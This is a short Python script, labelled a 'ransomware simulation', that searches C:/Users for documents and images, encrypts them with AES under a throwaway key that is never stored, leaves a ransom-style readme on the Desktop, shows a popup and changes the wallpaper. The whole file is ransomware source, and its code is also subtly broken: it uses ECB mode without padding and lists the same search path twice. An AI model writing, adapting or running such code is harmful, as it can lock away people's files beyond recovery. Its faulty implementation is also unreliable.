import os
import sys
import glob
import getpass
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from threading import Thread
import ctypes
import tkinter as tk
from tkinter import messagebox

# BOLD: **Ransomware Simulation**

def login_screen():
    print("Enter your password:")
    password = getpass.getpass()
    if password == "your_password":
        return True
    else:
        return False

def collect_files(file_types):
    collected_files = []
    for file_type in file_types:
        for path in ["C:/Users/*/", "C:/Users/*/"]:
            for filepath in glob.glob(path + f"**/*{file_type}", recursive=True):
                collected_files.append(filepath)
    return collected_files

def encrypt_files(files, cipher):
    for filepath in files:
        with open(filepath, "rb") as file:
            data = file.read()
        encrypted_data = cipher.encrypt(data)
        new_filepath = filepath + ".enc"
        with open(new_filepath, "wb") as file:
            file.write(encrypted_data)

def create_readme():
    readme_text = "Your files have been encrypted. Follow the instructions to recover them."
    with open(os.path.expanduser("~/Desktop/readme.txt"), "w") as readme_file:
        readme_file.write(readme_text)

def show_popup():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Important Information", "Check the readme.txt file on your Desktop.")

def change_background():
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "path/to/wallpaper.jpg", 3)

def main():
    if not login_screen():
        sys.exit("Access denied")

    file_types = [".txt", ".doc", ".pdf", ".jpg", ".png"]
    files = collect_files(file_types)

    key = get_random_bytes(32)
    cipher = AES.new(key, AES.MODE_ECB)

    encryption_thread = Thread(target=encrypt_files, args=(files, cipher))
    encryption_thread.start()
    encryption_thread.join()

    create_readme()
    show_popup()
    change_background()

if __name__ == "__main__":
    main()
